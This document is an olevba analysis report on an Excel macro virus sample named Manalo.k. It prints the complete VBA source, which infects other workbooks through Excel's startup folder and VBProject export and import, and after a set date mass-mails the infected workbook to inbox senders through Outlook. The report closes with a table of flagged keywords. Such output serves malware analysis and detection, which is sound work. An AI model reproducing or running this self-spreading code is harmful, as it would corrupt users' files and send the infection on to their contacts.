olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Manalo.k-cd6cb4cd14fe964a9151cd5c36204dfa62e05e9a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet611.cls 
in file: Virus.MSExcel.Manalo.k-cd6cb4cd14fe964a9151cd5c36204dfa62e05e9a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet611'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Manalo.k-cd6cb4cd14fe964a9151cd5c36204dfa62e05e9a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Manalo.k-cd6cb4cd14fe964a9151cd5c36204dfa62e05e9a - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Manalo.k-cd6cb4cd14fe964a9151cd5c36204dfa62e05e9a - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Manalo.k-cd6cb4cd14fe964a9151cd5c36204dfa62e05e9a - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EGManalo.bas 
in file: Virus.MSExcel.Manalo.k-cd6cb4cd14fe964a9151cd5c36204dfa62e05e9a - OLE stream: '_VBA_PROJECT_CUR/VBA/EGManalo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'...........................................
'INC: 86 years and going strong. More power!
'July 26, 1914
'
'Electronics and Communications Engineering
'New Era University
'Milton Hills Subd., Diliman, Quezon City
'...........................................
'By AnGeL - Anak ng Sugo
'...........................................


Sub Auto_Open()
        Application.OnSheetActivate = "Run"
End Sub
Sub Send()

On Error Resume Next
MsgBox ("yes")
Set OL = CreateObject("Outlook.Application")
Set UNS = OL.GetNamespace("MAPI")

Set UIB = UNS.GetDefaultFolder(6)

ActiveWorkbook.Save
Att = ActiveWorkbook.FullName

For i = 1 To UIB.Items.Count
    Set M = UIB.Items(i)
    Set Z = M.Reply
    A = MsgBox(Z.Recipients(1).Address)
    Set FM = OL.CreateItem(0)
    FM.Recipients.Add A
    FM.Attachments.Add Att
    FM.Send
Next

Set OL = Nothing
Set UNS = Nothing

End Sub
Sub Run()
        
On Error GoTo Over

SU$ = Application.StartupPath
F$ = Dir(SU$ & "\" & "Happy Anniversary.xls")
ngayon = Format(Now, "yyyymmdd")
'MsgBox (Application.Version)

If F$ <> "Happy Anniversary.xls" Then GoTo FDNE Else GoTo IOF

FDNE:
         
   INF$ = ActiveWorkbook.Name
   
   Application.ScreenUpdating = False

   Set bago = Workbooks.Add
    With bago
        .Title = ""
        .Subject = ""
    End With
   
   NWB$ = ActiveWorkbook.Name
   Bed$ = Workbooks(NWB$).Sheets(1).Name

   If Bed$ <> "EGManalo" _
      Then
        Workbooks(INF$).Sheets("THE CHURCH OF CHRIST").Copy Before:=Workbooks(NWB$).Sheets(1)
        'Workbooks(INF$).Sheets("EGManalo").Copy Before:=Workbooks(NWB$).Sheets(1)
        'Workbooks(NWB$).Sheets("EGManalo").Visible = False
        Workbooks(INF$).VBProject.VBComponents("EGManalo").Export ("c:\1")
        Workbooks(NWB$).VBProject.VBComponents.Import ("c:\1")
        Workbooks(NWB$).Sheets("THE CHURCH OF CHRIST").Visible = False
      Else
   End If

   ActiveWindow.Visible = False
      
   Workbooks(NWB$).SaveAs Filename:=Application.StartupPath & "/" & "Happy Anniversary.xls"

GoTo Over

IOF:
        
   Angelo$ = ActiveWorkbook.Name
   For i = 1 To Workbooks(Angelo$).VBProject.VBComponents.Count
   If Workbooks(Angelo$).VBProject.VBComponents(i).Type = 1 Then _
   If Workbooks(Angelo$).VBProject.VBComponents(i).Name = "EGManalo" Then GoTo Brk
   Next
   i = i - 1
Brk:
   FirstBed$ = Workbooks(Angelo$).VBProject.VBComponents(i).Name
        
   Application.ScreenUpdating = False
   
   If FirstBed$ <> "EGManalo" _
      Then
        'Workbooks("Happy Anniversary.xls").Sheets("EGManalo").Copy Before:=Workbooks(Angelo$).Sheets(1)
        Workbooks("Happy Anniversary.xls").VBProject.VBComponents("EGManalo").Export ("c:\1")
        Workbooks(Angelo$).VBProject.VBComponents.Import ("c:\1")
        Workbooks("Happy Anniversary.xls").Sheets("THE CHURCH OF CHRIST").Copy Before:=Workbooks(Angelo$).Sheets(1)
        
        'Workbooks(Angelo$).Sheets("EGManalo").Visible = False
        Workbooks(Angelo$).Sheets("THE CHURCH OF CHRIST").Visible = False
        
Else
If (ngayon >= "20000726") Then Workbooks(Angelo$).Sheets("THE CHURCH OF CHRIST").Name = "Ang Iglesia Ni Cristo"

If (ngayon >= "20000726") Then Workbooks("Happy Anniversary.xls").Sheets("THE CHURCH OF CHRIST").Copy Before:=Workbooks(Angelo$).Sheets("Ang Iglesia Ni Cristo")

If (ngayon >= "20000726") Then Workbooks(Angelo$).Sheets("Ang Iglesia Ni Cristo").Visible = True

If (ngayon >= "20000726") Then Workbooks(Angelo$).Sheets("THE CHURCH OF CHRIST").Visible = False

If (ngayon >= "20000723") Then Application.Run ("Send")

End If

Over:
Application.OnSheetActivate = ""
Application.ScreenUpdating = True
Application.OnSheetActivate = "Happy Anniversary.xls!Run"

Last:
    
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     28 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  THE CHURCH OF CHRIS
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

